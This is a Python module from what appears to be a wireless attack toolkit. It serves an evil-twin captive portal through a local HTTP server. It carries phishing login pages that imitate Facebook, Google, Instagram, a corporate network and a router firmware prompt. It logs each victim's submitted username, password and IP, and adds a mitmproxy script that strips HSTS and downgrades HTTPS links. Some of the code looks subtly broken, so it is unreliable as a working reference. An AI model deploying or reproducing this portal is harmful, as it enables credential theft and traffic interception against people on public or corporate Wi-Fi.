"""Captive portal attack module.

Serves phishing / credential-harvesting HTTP pages via a Python
asyncio HTTP server.  Supports built-in templates and custom HTML.
Integrates with the evil twin for seamless credential capture.
"""

# ruff: noqa: E501 -- embedded HTML portal templates are intentionally long

from __future__ import annotations

import asyncio
import http.server
import logging
import urllib.parse
from dataclasses import dataclass, field
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from wafford.core.base import AttackPhase, AttackResult, BaseAttack
from wafford.exceptions import AttackError, ValidationError

logger = logging.getLogger("wafford.core.captive_portal")

PORTAL_DIR = Path(__file__).resolve().parent.parent / "wordlists" / "portals"

# ── Built-in templates ────────────────────────────────────────────────────────

TEMPLATES: dict[str, str] = {
    "generic": """\
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f0f2f5}
.card{background:#fff;padding:2rem;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.1);width:340px;text-align:center}
.card h2{margin-bottom:1rem;color:#333}
input{width:100%%;padding:12px;margin:6px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:6px}
button{width:100%%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:1rem;cursor:pointer;margin-top:8px}
button:hover{background:#1558b0}
</style></head><body>
<div class="card"><h2>WiFi Access</h2>
<form method="POST" action="/login">
<input name="username" placeholder="Username / Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form></div></body></html>""",
    "facebook": """\
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Facebook</title>
<style>
body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f0f2f5}
.card{background:#fff;padding:2rem;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.1);width:360px;text-align:center}
h1{color:#1877f2;font-size:2rem;margin-bottom:.5rem}
p{color:#666;margin-bottom:1rem}
input{width:100%%;padding:12px;margin:6px 0;box-sizing:border-box;border:1px solid #ccd0d5;border-radius:6px;font-size:.95rem}
.login{width:100%%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:1.1rem;font-weight:700;cursor:pointer;margin-top:8px}
.forgot{color:#1877f2;font-size:.85rem;margin-top:10px;display:block}
</style></head><body>
<div class="card"><h1>facebook</h1><p>Log in to Facebook</p>
<form method="POST" action="/login">
<input name="username" placeholder="Email or phone number" required>
<input name="password" type="password" placeholder="Password" required>
<button class="login" type="submit">Log In</button>
<a class="forgot" href="#">Forgotten password?</a>
</form></div></body></html>""",
    "google": """\
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google – Sign in</title>
<style>
body{font-family:'Google Sans','Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f8f9fa}
.card{background:#fff;padding:2rem 2.5rem;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.12);width:360px}
h1{font-size:1.4rem;color:#202124;margin-bottom:.2rem}
.logo{font-size:2.5rem;margin-bottom:1rem;color:#4285f4;text-align:center}
p{color:#5f6368;font-size:.9rem;margin-bottom:1.5rem}
input{width:100%%;padding:14px 12px;margin:6px 0;box-sizing:border-box;border:1px solid #dadce0;border-radius:4px;font-size:.95rem}
.next{width:100%%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:.9rem;cursor:pointer;margin-top:12px}
</style></head><body>
<div class="card"><div class="logo">G</div><h1>Sign in</h1><p>Use your Google Account</p>
<form method="POST" action="/login">
<input name="username" placeholder="Email or phone" required>
<input name="password" type="password" placeholder="Enter your password" required>
<button class="next" type="submit">Next</button>
</form></div></body></html>""",
    "instagram": """\
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Instagram</title>
<style>
body{font-family:-apple-system,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#fafafa}
.card{background:#fff;padding:2rem;border:1px solid #dbdbdb;border-radius:1px;width:350px;text-align:center}
h1{font-family:grand hotel,cursive;font-size:2.4rem;margin-bottom:1rem}
input{width:100%%;padding:10px;margin:5px 0;box-sizing:border-box;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:.85rem}
.login{width:100%%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-weight:600;cursor:pointer;margin-top:10px}
</style></head><body>
<div class="card"><h1>Instagram</h1>
<form method="POST" action="/login">
<input name="username" placeholder="Phone number, username, or email" required>
<input name="password" type="password" placeholder="Password" required>
<button class="login" type="submit">Log In</button>
</form></div></body></html>""",
    "corporate": """\
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Corporate WiFi – Authentication Required</title>
<style>
body{font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#232f3e}
.card{background:#fff;padding:2rem 2.5rem;border-radius:8px;width:400px}
.logo{text-align:center;margin-bottom:1.5rem}
.logo span{font-size:1.5rem;font-weight:700;color:#232f3e}
h2{color:#232f3e;font-size:1.1rem;margin-bottom:.3rem}
p{color:#666;font-size:.85rem;margin-bottom:1.2rem}
input{width:100%%;padding:10px;margin:5px 0;box-sizing:border-box;border:1px solid #aab7b8;border-radius:4px;font-size:.9rem}
button{width:100%%;padding:10px;background:#ff9900;color:#232f3e;border:none;border-radius:4px;font-weight:700;cursor:pointer;margin-top:8px}
</style></head><body>
<div class="card"><div class="logo"><span>CORP</span> WiFi</div>
<h2>Network Authentication</h2><p>Enter your corporate credentials to access the network.</p>
<form method="POST" action="/login">
<input name="username" placeholder="Domain\\username" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form></div></body></html>""",
    "router_update": """\
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Firmware Update Required</title>
<style>
body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#e74c3c}
.card{background:#fff;padding:2rem;border-radius:8px;width:400px;text-align:center}
.warn{font-size:3rem;margin-bottom:.5rem}
h2{color:#c0392b;margin-bottom:.5rem}
p{color:#555;font-size:.9rem;margin-bottom:1.2rem}
input{width:100%%;padding:10px;margin:5px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}
button{width:100%%;padding:10px;background:#e74c3c;color:#fff;border:none;border-radius:4px;font-weight:700;cursor:pointer;margin-top:8px}
</style></head><body>
<div class="card"><div class="warn">⚠️</div>
<h2>Firmware Update Required</h2><p>Your router needs a firmware update. Authenticate with your admin credentials to proceed.</p>
<form method="POST" action="/login">
<input name="username" placeholder="Admin Username" value="admin" required>
<input name="password" type="password" placeholder="Admin Password" required>
<button type="submit">Update Firmware</button>
</form></div></body></html>""",
    "free_wifi": """\
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Free WiFi</title>
<style>
body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:linear-gradient(135deg,#667eea,#764ba2)}
.card{background:rgba(255,255,255,.95);padding:2rem;border-radius:16px;width:360px;text-align:center}
.wifi{font-size:3rem;margin-bottom:.5rem}
h2{color:#333;margin-bottom:.3rem}
p{color:#666;font-size:.85rem;margin-bottom:1.2rem}
input{width:100%%;padding:12px;margin:5px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:8px;font-size:.9rem}
button{width:100%%;padding:12px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;margin-top:8px}
</style></head><body>
<div class="card"><div class="wifi">📶</div>
<h2>Free WiFi</h2><p>Sign in with your social media account to get free internet access.</p>
<form method="POST" action="/login">
<input name="username" placeholder="Email or Phone" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect Now</button>
</form></div></body></html>""",
}


@dataclass
class CapturedCredential:
    """A single harvested credential."""

    timestamp: str
    client_ip: str
    username: str
    password: str
    user_agent: str = ""
    template: str = ""


@dataclass
class PortalStatus:
    """Live status of the captive portal server."""

    running: bool = False
    port: int = 80
    template: str = "generic"
    http_pid: int = 0
    credentials_captured: int = 0
    total_requests: int = 0
    clients_redirected: set[str] = field(default_factory=set)
    elapsed: float = 0.0


class CaptivePortal(BaseAttack):
    """Async HTTP server that serves a credential-harvesting portal.

    After the victim submits the form the server:

    1.  Logs the credentials.
    2.  Responds with a redirect to the real captive portal / internet.
    """

    name = "captive_portal"

    def __init__(self, interface: str = "") -> None:
        super().__init__(interface)
        self.portal = PortalStatus()
        self._captured: list[CapturedCredential] = []
        self._http_task: asyncio.Task[None] | None = None
        self._server: asyncio.AbstractServer | None = None
        self._custom_html: str = ""

    # ── Public API ────────────────────────────────────────────────────────

    async def serve(
        self,
        portal_template: str = "generic",
        interface: str = "",
        port: int = 80,
    ) -> AttackResult:
        """Start the captive portal HTTP server.

        Parameters
        ----------
        portal_template:
            One of the built-in template names or ``'custom'``.
        interface:
            Network interface (optional — used for metadata).
        port:
            TCP port to bind (default 80).
        """
        if interface:
            self.interface = interface
        self.portal.port = port
        self.portal.template = portal_template

        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")

        html_body = self.generate_portal(portal_template)
        self._emit("captive_portal.starting", {"template": portal_template, "port": port})

        self._http_task = asyncio.create_task(self._run_http_server(html_body, port))
        self._tasks.append(self._http_task)
        await asyncio.sleep(1)

        if self._http_task.done() and self._http_task.exception():
            raise AttackError(f"HTTP server failed: {self._http_task.exception()}")

        self.portal.running = True
        self._info("Captive portal serving on port %d (template: %s)", port, portal_template)

        return AttackResult(
            success=True,
            message=f"Captive portal running on :{port} (template={portal_template})",
            extra={"portal": self.portal},
        )

    async def serve_forever(self) -> None:
        """Block until cancelled (useful when portal is the main attack)."""
        try:
            while not self._cancel_event.is_set():
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            pass

    def generate_portal(self, template_name: str, custom_html: str = "") -> str:
        """Render and return the portal HTML."""
        if template_name == "custom":
            if not custom_html:
                raise ValidationError(
                    "custom_html required for template=custom", field="custom_html"
                )
            self._custom_html = custom_html
            return custom_html
        if template_name not in TEMPLATES:
            raise ValidationError(
                f"Unknown template: {template_name}. Available: {', '.join(TEMPLATES)}",
                field="template_name",
            )
        return TEMPLATES[template_name]

    def harvest_credentials(self) -> list[dict[str, str]]:
        """Return all captured credentials as a list of dicts."""
        return [
            {
                "timestamp": c.timestamp,
                "client_ip": c.client_ip,
                "username": c.username,
                "password": c.password,
                "user_agent": c.user_agent,
                "template": c.template,
            }
            for c in self._captured
        ]

    def get_captured_count(self) -> int:
        return len(self._captured)

    async def redirect_after_capture(self, client_ip: str) -> None:
        """Mark *client_ip* as having been redirected to the real network."""
        self.portal.clients_redirected.add(client_ip)
        self._emit("captive_portal.redirected", {"client_ip": client_ip})

    async def start_ssl_stripping(self) -> AttackResult:
        """Start mitmproxy-based SSL strip for HTTPS downgrade."""
        self._require_tool("mitmproxy")
        self._info("Starting SSL stripping via mitmproxy…")

        mitmdump_cmd = [
            "mitmdump",
            "--mode", "transparent",
            "--ssl-insecure",
            "-s", "-",  # inline script
        ]
        strip_script = '''
from mitmproxy import http
def response(flow: http.HTTPFlow) -> None:
    if flow.response:
        flow.response.headers.pop("Strict-Transport-Security", None)
        ct = flow.response.headers.get("content-type", "")
        if "text/html" in ct:
            body = flow.response.get_text() or ""
            body = body.replace("https://", "http://")
            flow.response.set_text(body)
'''
        proc = await asyncio.create_subprocess_exec(
            *mitmdump_cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        self._processes.append(proc)
        if proc.stdin:
            proc.stdin.write(strip_script.encode())
            proc.stdin.close()

        self._emit("captive_portal.ssl_strip_started", {})
        return AttackResult(success=True, message="SSL stripping enabled")

    async def stop(self) -> AttackResult:  # type: ignore[override]
        """Shutdown the portal server."""
        self._info("Stopping captive portal…")
        self._cancel_event.set()
        self.portal.running = False

        if self._server:
            self._server.close()
            await self._server.wait_closed()

        self._emit("captive_portal.stopped", {
            "total_captured": len(self._captured),
            "total_requests": self.portal.total_requests,
        })

        return AttackResult(
            success=True,
            message=f"Portal stopped. Captured {len(self._captured)} credentials.",
            extra={"captured": self.harvest_credentials()},
        )

    def get_status(self) -> PortalStatus:
        return self.portal

    # ── Internal HTTP server ──────────────────────────────────────────────

    async def _run_http_server(self, html_body: str, port: int) -> None:
        portal_ref = self
        captured_ref = self._captured

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self: Any) -> None:
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Connection", "close")
                self.end_headers()
                self.wfile.write(html_body.encode())
                portal_ref.portal.total_requests += 1

            def do_POST(self: Any) -> None:
                content_length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(content_length).decode(errors="replace")
                params = {}
                for pair in body.split("&"):
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        params[urllib.parse.unquote_plus(k)] = urllib.parse.unquote_plus(v)

                username = params.get("username", "")
                password = params.get("password", "")
                client_ip = self.client_address[0]
                user_agent = self.headers.get("User-Agent", "")

                if username or password:
                    entry = CapturedCredential(
                        timestamp=datetime.now(UTC).isoformat(),
                        client_ip=client_ip,
                        username=username,
                        password=password,
                        user_agent=user_agent,
                        template=portal_ref.portal.template,
                    )
                    captured_ref.append(entry)
                    portal_ref.portal.credentials_captured = len(captured_ref)
                    portal_ref._info(
                        "Credential captured: %s / %s from %s",
                        username[:20],
                        "***",
                        client_ip,
                    )
                    portal_ref._emit("captive_portal.captured", {
                        "client_ip": client_ip,
                        "total": len(captured_ref),
                    })

                # Respond with redirect to the original page
                self.send_response(302)
                self.send_header("Location", "/")
                self.send_header("Connection", "close")
                self.end_headers()

            def log_message(self: Any, format: str, *args: Any) -> None:  # noqa: A002
                portal_ref._debug("HTTP %s", format % args)

        try:
            self._server = await asyncio.get_event_loop().create_server(
                lambda: Handler(),  # type: ignore[arg-type, call-arg, return-value]
                "0.0.0.0",  # noqa: S104 -- portal must bind all interfaces
                port,
            )
            self._info("HTTP server bound to port %d", port)
            await self._server.serve_forever()
        except OSError as exc:
            self._error("HTTP server bind failed: %s", exc)
            raise AttackError(f"Cannot bind port {port}: {exc}") from exc

    async def _cleanup(self) -> None:
        if self._server:
            self._server.close()
            try:
                await asyncio.wait_for(self._server.wait_closed(), timeout=5)
            except (TimeoutError, OSError):
                pass
        self.portal.running = False
        await super()._cleanup()
